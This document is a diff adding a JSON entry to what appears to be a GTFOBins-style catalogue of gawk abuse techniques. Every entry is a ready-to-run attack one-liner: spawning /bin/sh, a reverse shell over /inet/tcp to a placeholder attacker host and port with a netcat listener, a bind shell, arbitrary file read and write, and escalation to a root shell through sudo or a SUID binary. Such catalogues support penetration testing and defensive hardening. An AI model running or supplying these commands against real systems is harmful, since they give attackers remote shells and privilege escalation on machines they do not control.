@@ -1,0 +1,41 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "gawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ],
+    "non-interactive-reverse-shell": [
+      {
+        "description": "Run 'nc -l -p [port]' on the attacker box to receive the shell.",
+        "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/[host]/[port]\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
+      }
+    ],
+    "non-interactive-bind-shell": [
+      {
+        "description": "Run 'nc target.com 12345' on the attacker box to connect to the shell.",
+        "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/[port]/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "gawk 'BEGIN { print \"DATA\" > \"[file]\" }'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "gawk '//' [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./gawk 'BEGIN {system(\"/bin/sh\")}'"
+      }
+    ]
+  }
+}
